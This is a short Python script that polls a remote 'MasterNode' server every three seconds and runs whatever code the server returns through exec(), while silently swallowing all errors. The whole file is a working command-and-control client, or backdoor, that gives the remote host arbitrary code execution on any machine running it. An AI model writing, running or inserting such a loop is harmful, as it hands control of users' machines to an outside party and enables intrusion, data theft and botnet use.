import requests
import time

current_action = ""
proceed = True

while (proceed):
  try:
    time.sleep(3)
    response = requests.get("https://MasterNode--yevbar.repl.co")
    json_data = response.json()
    proceed = json_data["continue_"] == u'true'
    if current_action != json_data["action_"]:
      current_action = json_data["action_"]
    exec(current_action)
  except Exception as e:
    two = 1 + 1
